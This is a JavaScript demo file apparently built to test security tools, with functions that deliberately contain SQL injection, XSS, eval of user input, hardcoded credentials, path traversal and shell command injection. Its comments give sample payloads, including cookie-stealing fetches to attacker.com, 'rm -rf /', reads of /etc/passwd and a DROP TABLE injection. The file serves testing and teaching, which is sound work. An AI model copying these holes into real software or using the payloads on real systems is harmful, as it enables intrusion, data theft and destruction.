/**
 * DEMO FILE - INTENTIONAL VULNERABILITIES FOR TESTING
 * This file contains common security vulnerabilities:
 * 1. SQL Injection
 * 2. Cross-Site Scripting (XSS)
 * 3. Hardcoded secrets (bonus)
 * 
 * DO NOT USE IN PRODUCTION
 */

// ==========================================
// VULNERABILITY 1: SQL INJECTION
// ==========================================

//hey there

const sqlite3 = require('sqlite3');
const db = new sqlite3.Database(':memory:');

/**
 * VULNERABLE: Directly concatenating user input into SQL query
 * An attacker could pass: user' OR '1'='1 
 * This would allow unauthorized access to all users
 */
function getUser(userId) {
  const query = `SELECT * FROM users WHERE id = ${userId}`;
  // VULNERABLE: No parameterized queries
  db.all(query, (err, rows) => {
    if (err) console.error(err);
    return rows;
  });
}

/**
 * VULNERABLE: SQL Injection via string concatenation
 */
function loginUser(username, password) {
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  // VULNERABLE: Attacker can inject SQL: admin' --
  return db.all(query);
}

/**
 * VULNERABLE: Building query with template literals (no sanitization)
 */
function searchUsers(searchTerm) {
  const sql = `SELECT * FROM users WHERE name LIKE '%${searchTerm}%' OR email LIKE '%${searchTerm}%'`;
  // VULNERABLE: Direct concatenation
  db.run(sql);
}


// ==========================================
// VULNERABILITY 2: CROSS-SITE SCRIPTING (XSS)
// ==========================================

/**
 * VULNERABLE: Directly inserting user input into HTML without escaping
 * Attacker could inject: <img src=x onerror="alert('XSS')">
 */
function displayUserProfile(userData) {
  // VULNERABLE: No HTML escaping
  const profileHTML = `
    <div class="profile">
      <h1>${userData.name}</h1>
      <p>${userData.bio}</p>
      <img src="${userData.profilePicUrl}" />
    </div>
  `;
  return profileHTML;
}

/**
 * VULNERABLE: Using innerHTML instead of textContent
 */
function renderUserComment(comment) {
  const commentElement = document.getElementById('comments');
  // VULNERABLE: innerHTML allows script injection
  commentElement.innerHTML = `<p>User said: ${comment.text}</p>`;
  // Attacker payload: <img src=x onerror="fetch('http://attacker.com?data=' + document.cookie)">
}

/**
 * VULNERABLE: XSS via URL parameter without sanitization
 */
function loadUserPage(userId) {
  const userQueryParam = new URLSearchParams(window.location.search).get('user');
  document.title = `${userQueryParam}'s Profile`; // VULNERABLE if userQueryParam contains scripts
  
  const html = `
    <div class="user-header">
      <h1>${userQueryParam}</h1>
    </div>
  `;
  // VULNERABLE: Direct DOM manipulation
  document.body.innerHTML += html;
}

/**
 * VULNERABLE: eval() with user input (dangerous!)
 */
function executeUserScript(userInput) {
  // CRITICALLY VULNERABLE: eval() should NEVER be used with user input
  eval(`const result = ${userInput}`);
  // Attacker could input: fetch('http://attacker.com?cookie=' + document.cookie)
}

/**
 * VULNERABLE: DOM-based XSS via innerHTML
 */
function updateNotifications(notificationText) {
  const notificationBar = document.querySelector('#notification');
  // VULNERABLE: Using innerHTML without sanitization
  notificationBar.innerHTML = notificationText;
  // If notificationText = "<script>alert('hacked')</script>", the script executes
}


// ==========================================
// BONUS VULNERABILITY: HARDCODED SECRETS
// ==========================================

// VULNERABLE: API keys hardcoded in source code
const API_KEYS = {
  slack: 'SLACK_BOT_TOKEN_DEMO',
  database: 'MONGODB_URI_DEMO',
  aws: 'AWS_CREDENTIALS_DEMO',
};

// VULNERABLE: Storing secrets in comments
const SECRET_TOKEN = 'OPENAI_PROJECT_KEY_DEMO'; // Don't share this!

/**
 * VULNERABLE: Basic auth credentials in code
 */
function makeAuthenticatedRequest(url) {
  const credentials = {
    username: 'admin',
    password: 'Admin@12345', // VULNERABLE: Hardcoded password
  };
  
  fetch(url, {
    headers: {
      'Authorization': 'Basic ' + Buffer.from(`${credentials.username}:${credentials.password}`).toString('base64'),
    },
  });
}


// ==========================================
// VULNERABLE DATABASE OPERATIONS
// ==========================================

/**
 * VULNERABLE: No input validation or sanitization
 */
function createUserRecord(input) {
  const query = `
    INSERT INTO users (username, email, age, profile_url)
    VALUES ('${input.username}', '${input.email}', ${input.age}, '${input.profileUrl}')
  `;
  // Multiple injection points without validation
  return db.run(query);
}

/**
 * VULNERABLE: Dynamic table name concatenation
 */
function getTableData(tableName, columnName) {
  // VULNERABLE: Attacker could pass: users; DROP TABLE users; --
  const query = `SELECT * FROM ${tableName} WHERE ${columnName} IS NOT NULL`;
  return db.all(query);
}


// ==========================================
// VULNERABLE WEB HANDLERS
// ==========================================

/**
 * VULNERABLE: Express route without input validation
 */
function handleUserUpdate(req, res) {
  const updateQuery = `UPDATE users SET bio = '${req.body.bio}' WHERE id = ${req.params.id}`;
  // VULNERABLE: Direct concatenation from request body
  
  res.send(`<h1>Bio updated to: ${req.body.bio}</h1>`);
  // VULNERABLE: XSS in response without escaping
}

/**
 * VULNERABLE: File path manipulation
 */
function serveUserFile(filename) {
  // VULNERABLE: Path traversal attack
  // Attacker could use: ../../etc/passwd
  const filePath = `/uploads/${filename}`;
  return fs.readFileSync(filePath);
}


// ==========================================
// VULNERABLE: COMMAND INJECTION
// ==========================================

const { exec } = require('child_process');

/**
 * VULNERABLE: Command injection via user input
 */
function processVideo(videoId) {
  // VULNERABLE: User input directly in shell command
  // Attacker could input: 123; rm -rf /
  const command = `ffmpeg -i /videos/${videoId}.mp4 -c copy output.mp4`;
  
  exec(command, (error) => {
    if (error) console.error(`Error: ${error.message}`);
  });
}

/**
 * VULNERABLE: Shell command injection
 */
function searchLogs(searchPattern) {
  // VULNERABLE: Unescaped user input in shell command
  // Attacker could input: '; cat /etc/passwd; echo '
  exec(`grep -r "${searchPattern}" /var/logs/`);
}


export {
  getUser,
  loginUser,
  searchUsers,
  displayUserProfile,
  renderUserComment,
  loadUserPage,
  executeUserScript,
  updateNotifications,
  createUserRecord,
  getTableData,
  handleUserUpdate,
  serveUserFile,
  processVideo,
  searchLogs,
};
